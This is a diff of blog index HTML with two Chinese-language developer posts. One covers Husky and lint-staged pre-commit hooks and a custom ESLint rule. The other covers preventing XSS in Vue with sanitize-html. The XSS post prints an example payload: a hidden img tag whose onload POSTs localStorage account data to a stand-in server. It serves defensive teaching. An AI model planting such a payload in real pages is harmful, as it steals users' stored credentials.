@@ -74,6 +74,275 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-PreCommitLocalRules" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/19/PreCommitLocalRules/" class="article-date">
+  <time class="dt-published" datetime="2022-07-19T16:01:08.000Z" itemprop="datePublished">2022-07-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%B7%A5%E7%A8%8B%E5%AF%A6%E8%B8%90/">工程實踐</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/07/19/PreCommitLocalRules/">Pre Commit ESLint Local Rules</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>我們在開發專案的時候，為了程式碼的品質 通常會用各種輔助工具幫助我們檢查（例如： ESLint, Formater, Testing …)</p>
+<p>Git hooks 可以透過在 before commit 之前做一些檢查，雖然會稍微慢一點 但是為了整體的開發格式是 OK 的</p>
+<p>此文件主要是在討論 一種情況</p>
+<p>今天你可能在開發 Vue 元件的時候，你可能不希望有一些元件被引用了不該引用的檔案或是使用套件</p>
+<p>EX:</p>
+<p>填寫表單的頁面 不允許使用 Pinia or 使用特定的元件( 避免相依性之類)<br>這時候除了寫文件以外 一定都會想到 那我就在註解 OR Commit 的時候檢查，這時候 EsLint Local Rules 就出現了</p>
+<h1 id="PreRequires"><a href="#PreRequires" class="headerlink" title="PreRequires"></a>PreRequires</h1><p>Vue &amp; Vite Cli</p>
+<p>主要是以下的套件需要安裝:</p>
+<p>可以參考從<a target="_blank" rel="noopener" href="https://www.coffeeclass.io/articles/commit-better-code-with-husky-prettier-eslint-lint-staged">Husky Lint-staged</a> 開始安裝</p>
+<ol>
+<li>Husky install<blockquote>
+<p>此套件主要是可以比較簡單操作 Git hooks</p>
+</blockquote>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx husky-init &amp;&amp; npm install</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>Lint staged install<blockquote>
+<p>此套件主要是針對 Commit Code 只會針對這些 Commit 的檔案做優化 以及檢查 而不會所有專案內的檔案檢查 增加效率</p>
+</blockquote>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save-dev lint-staged</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>Modify .husky pre-commit file<blockquote>
+<p>修改.husky 資料夾底下的 pre-commit 檔案</p>
+</blockquote>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">. &quot;$(dirname &quot;$0&quot;)/_/husky.sh&quot;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>Modify package.json<blockquote>
+<p>修改 package.json 直接在 root 底下新增這個 KEY<br>可以參考官方文件 也可以分離出來<a target="_blank" rel="noopener" href="https://github.com/okonet/lint-staged#Configuration">Config</a><br>我們只需要針對 vue ,ts, js 檔案做優化</p>
+</blockquote>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;lint-staged&quot;: &#123;</span><br><span class="line">    &quot;**/*.&#123;js,ts,vue&#125;&quot;: [</span><br><span class="line">      &quot;npx eslint --fix&quot;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>接著就可以隨便測試看看 Commit 一個不合法的 js 檔案</p>
+<img src="/2022/07/19/PreCommitLocalRules/01.png" class="" title="Example">
+
+<p>正常會在 GIT Console 上面顯示 eslint 檢查出來的錯誤 這樣就設定完成了</p>
+<img src="/2022/07/19/PreCommitLocalRules/02.png" class="" title="Error">
+
+<h1 id="EsLint-Local-Rules"><a href="#EsLint-Local-Rules" class="headerlink" title="EsLint Local Rules"></a>EsLint Local Rules</h1><p>接著介紹今天的主角，如果我們想要客製一些 只有我們專案會用到的規則</p>
+<p>就可以透過<a target="_blank" rel="noopener" href="https://www.npmjs.com/package/eslint-plugin-local-rules">eslint-plugin-local-rules</a>來達到</p>
+<p>這裡直接跳過安裝，從設定開始</p>
+<h2 id="Setting-EsLint-Local-Rules"><a href="#Setting-EsLint-Local-Rules" class="headerlink" title="Setting EsLint Local Rules"></a>Setting EsLint Local Rules</h2><ol>
+<li>在你的 ESLint Config 設定 plugin &amp;你想要綁定的 rule 以及錯誤的程度</li>
+</ol>
+<p>以 vue cli 來說預設是在 package.json 裡面 的 rules Object<br>新增你自訂的規則以及 plugin</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;eslintConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;root&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;node&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;extends&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;plugin:vue/vue3-essential&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;@vue/airbnb&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parserOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;parser&quot;</span><span class="punctuation">:</span> <span class="string">&quot;@babel/eslint-parser&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;max-len&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;error&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">1000</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;local-rules/disallow-identifiers&quot;</span><span class="punctuation">:</span> <span class="string">&quot;error&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;plugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;eslint-plugin-local-rules&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>接著 create eslint-local-rules folder and index.js 制定出我們需要的規則</li>
+</ol>
+<p>文件可以參考此<a target="_blank" rel="noopener" href="https://eslint.org/docs/latest/developer-guide/working-with-rules#runtime-rules">working-with-rules</a></p>
+<p>首先我們先以<a target="_blank" rel="noopener" href="https://github.com/Josephmtsai/vue_menu">Demo</a><br>來看</p>
+<p>我們先自訂一個 local rules 用途主要是 comment 有<br>&#x2F;&#x2F;eslint-disable-package: testbutton<br>他就去檢查 import 的元件是否有 TestButton 這個字眼</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="string">&#x27;vue-package-checker&#x27;</span>: &#123;</span><br><span class="line">    <span class="attr">meta</span>: &#123;</span><br><span class="line">      <span class="attr">fixable</span>: <span class="string">&#x27;code&#x27;</span>,</span><br><span class="line">      <span class="attr">docs</span>: &#123;</span><br><span class="line">        <span class="attr">description</span>: <span class="string">&#x27;Should not using TestButton in this component&#x27;</span>,</span><br><span class="line">        <span class="attr">category</span>: <span class="string">&#x27;Possible Errors&#x27;</span>,</span><br><span class="line">        <span class="attr">recommended</span>: <span class="literal">false</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">schema</span>: [],</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">create</span>(<span class="params">context</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="title class_">ImportDeclaration</span>(node) &#123;</span><br><span class="line">          <span class="comment">// 只撈取import相關的資訊</span></span><br><span class="line">          <span class="keyword">const</span> comments = context.<span class="title function_">getAllComments</span>();</span><br><span class="line">          <span class="keyword">if</span> (</span><br><span class="line">            comments.<span class="title function_">findIndex</span>(<span class="function">(<span class="params">comment</span>) =&gt;</span></span><br><span class="line">              comment.<span class="property">value</span>.<span class="title function_">includes</span>(<span class="string">&#x27;eslint-disable-package: testbutton&#x27;</span>)</span><br><span class="line">            ) !== -<span class="number">1</span></span><br><span class="line">          ) &#123;</span><br><span class="line">            <span class="keyword">if</span> (node.<span class="property">source</span>.<span class="property">value</span>.<span class="title function_">includes</span>(<span class="string">&#x27;TestButton&#x27;</span>)) &#123;</span><br><span class="line">              context.<span class="title function_">report</span>(&#123;</span><br><span class="line">                node,</span><br><span class="line">                <span class="attr">message</span>: <span class="string">&#x27;Should not using TestButton in this component&#x27;</span>,</span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>我們可以透過 Commit 來測試,也可以透過 report 錯誤把資訊印出來 Debug</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">context.<span class="title function_">report</span>(&#123;</span><br><span class="line">  node,</span><br><span class="line">  <span class="attr">message</span>: node.<span class="property">source</span>.<span class="property">value</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/19/PreCommitLocalRules/03.png" class="" title="Example">
+
+<p>在上面的連結中 也有各式各樣的 Statement 可以去檢查變數的命名或是 Catch 的錯誤之類的資訊<br>VariableDeclaration<br>CatchClause</p>
+<p>也可以參考以下這篇文章<br><a target="_blank" rel="noopener" href="https://cn.eslint.org/docs/developer-guide/working-with-rules">中文版 Custom Rules</a><br>….</p>
+<h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>這個用途主要是在 如果在測試不足的狀況下<br>可以透過自訂 ESLINT 規則來規範團隊的開發.並且避免一些不必要的引用. 尤其是有可能這個元件也會需要給第三方 或是其他人使用</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://www.coffeeclass.io/articles/commit-better-code-with-husky-prettier-eslint-lint-staged">Commit Better Code with Husky, Prettier, ESLint, and Lint-Staged</a><br><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10278411">Husky - Git Hooks 工具</a><br><a target="_blank" rel="noopener" href="https://eslint.org/docs/latest/developer-guide/working-with-rules#runtime-rules">working-with-rules</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://josephmtsai.github.io/2022/07/19/PreCommitLocalRules/" data-id="cmpc2o2ee0022su4ehdwn3e7m" data-title="Pre Commit ESLint Local Rules" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ESLint/" rel="tag">ESLint</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pre-Commit/" rel="tag">Pre-Commit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-VueHTMLTemplate" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/06/26/VueHTMLTemplate/" class="article-date">
+  <time class="dt-published" datetime="2022-06-26T15:39:36.000Z" itemprop="datePublished">2022-06-26</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/">前端開發</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/06/26/VueHTMLTemplate/">Vue Dynamic HTML Prevent XSS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>在開發系統中 有可能會需要使用到 CMS 系統或是動態抓取 CDN 的頁面 取得</p>
+<p>使用者動態設定的樣板或是 Banner 這裡一般人可能不會特別想到就是 XSS Attack</p>
+<p>我曾經遇過公司 有駭客入侵將靜態的 html 檔案裏面故意塞惡意程式碼，導致使用者看到錯誤畫面的狀況(被導走到其他頁面)</p>
+<p>(ex: 這些 html 可能被駭客塞一些 js or redirect 導到錯誤網站 讓使用者看到一些錯誤資訊)</p>
+<p>可以參考這篇<br><a target="_blank" rel="noopener" href="https://www.stackhawk.com/blog/vue-xss-guide-examples-and-prevention/#injecting-the-malicious-script">Vue XSS Attack Guide</a></p>
+<p>舉例來說我們可以透過隱藏的圖片發送 request 給 駭客的 Server 並且偷取到對應的 Cookie or Session ….</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;xxxx&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;fetch(&#x27;https://test.api/&#x27;, &#123;method: &#x27;POST&#x27;, body: localStorage.getItem(&#x27;account&#x27;)&#125;)&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>這裡列出兩種 vue 的 componet 可以動態 compile html ，這裡列出來用途以及差異<br>| Plugnin | Support | different | |<br>|——————–|——–|— ——–|—|<br>| v-html | 只支援純粹 HTML 無法支援 vue custom component | 無法防止 XSS attack |<br>| v-runtime-template | 支援 vue custom component &amp; variabe (需事先定義好) | 無法防止 XSS attack |</p>
+<p>可能大家沒有感覺 那我們先來看以下範例<br>如果沒有透過過濾不合法的 tag 在上面的 Demo 內 會出現什麼呢?</p>
+<ol>
+<li>xss 的 alert</li>
+<li>非法的 iframe (假設我們沒有規定 iframe 是可以出現的)</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://codesandbox.io/s/dynamic-template-yvfx0n">DEMO</a></p>
+<p>接下來我們介紹今天的主角 Sanitize html</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apostrophecms/sanitize-html">sanitize html</a><br>在 Vue 3 裡面可以用<a target="_blank" rel="noopener" href="https://github.com/vannsl/vue-3-sanitize">vue-3-sanitize</a></p>
+<p>套件</p>
+<p>我們這裡可以透過此套件將 HTML 不合法的 TAG 或是相對應的 TAG 做一些限制以及過濾<br>這裡列出兩大項</p>
+<ol>
+<li>限制動態 HTML 的 TAG</li>
+</ol>
+<p>Default options</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allowedTags</span>: [</span><br><span class="line">  <span class="string">&quot;address&quot;</span>, <span class="string">&quot;article&quot;</span>, <span class="string">&quot;aside&quot;</span>, <span class="string">&quot;footer&quot;</span>, <span class="string">&quot;header&quot;</span>, <span class="string">&quot;h1&quot;</span>, <span class="string">&quot;h2&quot;</span>, <span class="string">&quot;h3&quot;</span>, <span class="string">&quot;h4&quot;</span>,</span><br><span class="line">  <span class="string">&quot;h5&quot;</span>, <span class="string">&quot;h6&quot;</span>, <span class="string">&quot;hgroup&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="string">&quot;nav&quot;</span>, <span class="string">&quot;section&quot;</span>, <span class="string">&quot;blockquote&quot;</span>, <span class="string">&quot;dd&quot;</span>, <span class="string">&quot;div&quot;</span>,</span><br><span class="line">  <span class="string">&quot;dl&quot;</span>, <span class="string">&quot;dt&quot;</span>, <span class="string">&quot;figcaption&quot;</span>, <span class="string">&quot;figure&quot;</span>, <span class="string">&quot;hr&quot;</span>, <span class="string">&quot;li&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="string">&quot;ol&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;pre&quot;</span>,</span><br><span class="line">  <span class="string">&quot;ul&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;abbr&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;bdi&quot;</span>, <span class="string">&quot;bdo&quot;</span>, <span class="string">&quot;br&quot;</span>, <span class="string">&quot;cite&quot;</span>, <span class="string">&quot;code&quot;</span>, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;dfn&quot;</span>,</span><br><span class="line">  <span class="string">&quot;em&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;kbd&quot;</span>, <span class="string">&quot;mark&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;rb&quot;</span>, <span class="string">&quot;rp&quot;</span>, <span class="string">&quot;rt&quot;</span>, <span class="string">&quot;rtc&quot;</span>, <span class="string">&quot;ruby&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;samp&quot;</span>,</span><br><span class="line">  <span class="string">&quot;small&quot;</span>, <span class="string">&quot;span&quot;</span>, <span class="string">&quot;strong&quot;</span>, <span class="string">&quot;sub&quot;</span>, <span class="string">&quot;sup&quot;</span>, <span class="string">&quot;time&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;var&quot;</span>, <span class="string">&quot;wbr&quot;</span>, <span class="string">&quot;caption&quot;</span>,</span><br><span class="line">  <span class="string">&quot;col&quot;</span>, <span class="string">&quot;colgroup&quot;</span>, <span class="string">&quot;table&quot;</span>, <span class="string">&quot;tbody&quot;</span>, <span class="string">&quot;td&quot;</span>, <span class="string">&quot;tfoot&quot;</span>, <span class="string">&quot;th&quot;</span>, <span class="string">&quot;thead&quot;</span>, <span class="string">&quot;tr&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="attr">disallowedTagsMode</span>: <span class="string">&#x27;discard&#x27;</span>,</span><br><span class="line"><span class="attr">allowedAttributes</span>: &#123;</span><br><span class="line">  <span class="attr">a</span>: [ <span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;target&#x27;</span> ],</span><br><span class="line">  <span class="comment">// We don&#x27;t currently allow img itself by default, but</span></span><br><span class="line">  <span class="comment">// these attributes would make sense if we did.</span></span><br><span class="line">  <span class="attr">img</span>: [ <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;srcset&#x27;</span>, <span class="string">&#x27;alt&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;width&#x27;</span>, <span class="string">&#x27;height&#x27;</span>, <span class="string">&#x27;loading&#x27;</span> ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// Lots of these won&#x27;t come up by default because we don&#x27;t allow them</span></span><br><span class="line"><span class="attr">selfClosing</span>: [ <span class="string">&#x27;img&#x27;</span>, <span class="string">&#x27;br&#x27;</span>, <span class="string">&#x27;hr&#x27;</span>, <span class="string">&#x27;area&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;basefont&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;meta&#x27;</span> ],</span><br><span class="line"><span class="comment">// URL schemes we permit</span></span><br><span class="line"><span class="attr">allowedSchemes</span>: [ <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;mailto&#x27;</span>, <span class="string">&#x27;tel&#x27;</span> ],</span><br><span class="line"><span class="attr">allowedSchemesByTag</span>: &#123;&#125;,</span><br><span class="line"><span class="attr">allowedSchemesAppliedToAttributes</span>: [ <span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;cite&#x27;</span> ],</span><br><span class="line"><span class="attr">allowProtocolRelative</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">enforceHtmlBoundary</span>: <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>限制 CSS &amp; Script &amp; iframe 語法</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> clean = <span class="title function_">sanitizeHtml</span>(</span><br><span class="line">  <span class="string">&#x27;&lt;script src=&quot;https://www.safe.authorized.com/lib.js&quot;&gt;&lt;/script&gt;&#x27;</span>,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">allowedTags</span>: [<span class="string">&#x27;script&#x27;</span>],</span><br><span class="line">    <span class="attr">allowedAttributes</span>: &#123;</span><br><span class="line">      <span class="attr">script</span>: [<span class="string">&#x27;src&#x27;</span>],</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">allowedScriptDomains</span>: [<span class="string">&#x27;authorized.com&#x27;</span>],</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">onst clean = sanitizeHtml(dirty, &#123;</span><br><span class="line">        allowedTags: [<span class="string">&#x27;p&#x27;</span>],</span><br><span class="line">        allowedAttributes: &#123;</span><br><span class="line">          &#x27;<span class="selector-tag">p</span>&#x27;: [<span class="string">&quot;style&quot;</span>],</span><br><span class="line">        &#125;,</span><br><span class="line">        allowedStyles: &#123;</span><br><span class="line">          &#x27;*&#x27;: &#123;</span><br><span class="line">            // Match HEX and RGB</span><br><span class="line">            &#x27;<span class="attribute">color</span>&#x27;: [/^#(<span class="number">0</span>x)?[<span class="number">0</span>-<span class="number">9</span>a-f]+$/i, /^rgb\(\s*(\d&#123;<span class="number">1</span>,<span class="number">3</span>&#125;)\s*,\s*(\d&#123;<span class="number">1</span>,<span class="number">3</span>&#125;)\s*,\s*(\d&#123;<span class="number">1</span>,<span class="number">3</span>&#125;)\s*\)$/],</span><br><span class="line">            &#x27;<span class="attribute">text-align</span>&#x27;: [/^left$/, /^right$/, /^center$/],</span><br><span class="line">            // Match any number with px, em, or %</span><br><span class="line">            <span class="string">&#x27;font-size&#x27;</span>: [/^\d+(?:px|em|%)$/]</span><br><span class="line">          &#125;,</span><br><span class="line">          &#x27;<span class="selector-tag">p</span>&#x27;: &#123;</span><br><span class="line">            &#x27;<span class="attribute">font-size</span>&#x27;: [/^\d+rem$/]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>根據上面的設定後</p>
+<p>可以對照<a target="_blank" rel="noopener" href="https://codesandbox.io/s/dynamic-template-yvfx0n">DEMO</a><br>透過 sanitize 過濾掉有問題的語法 避免 XSS 攻擊</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$sanitize(<span class="variable language_">this</span>.<span class="property">message</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="範例"><a href="#範例" class="headerlink" title="範例"></a>範例</h3><p>那如果像剛剛這樣 假設我們想要允許特定 Domain 的 iframe 要怎麼辦呢</p>
+<p>我們可以透過 OverideOption 將特定的 domain &amp; tag 掛上去 這樣就可以避免 User 掛載一些奇怪的 Domain</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> overridenOptions = &#123;</span><br><span class="line">  <span class="attr">allowedTags</span>: [<span class="string">&#x27;iframe&#x27;</span>],</span><br><span class="line">  <span class="attr">allowedAttributes</span>: &#123;</span><br><span class="line">    <span class="attr">iframe</span>: [<span class="string">&#x27;src&#x27;</span>],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">allowedIframeHostnames</span>: [<span class="string">&#x27;www.youtube.com&#x27;</span>],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>因為靜態檔案最容易被人動手腳 尤其是系統一大 檔案一多不會有人時時刻刻去檢查…就需要有這種檢查幫助我們去過濾語法</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10238479">XSS(Cross site scripting) 簡單範例</a><br><a target="_blank" rel="noopener" href="https://www.softwaretestinghelp.com/cross-site-scripting-xss-attack-test/">XSS Sample</a><br><a target="_blank" rel="noopener" href="https://github.com/vannsl/vue-3-sanitize">Vue 3 Sanitize</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://josephmtsai.github.io/2022/06/26/VueHTMLTemplate/" data-id="cmpc2o2ep0034su4eg97hdi82" data-title="Vue Dynamic HTML Prevent XSS" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/" rel="tag">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/v-html/" rel="tag">v-html</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-VueApiErrorHandling" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/06/08/VueApiErrorHandling/" class="article-date">
+  <time class="dt-published" datetime="2022-06-08T12:58:20.000Z" itemprop="datePublished">2022-06-08</time>
+</a>
+    
+  <div class="article-category">
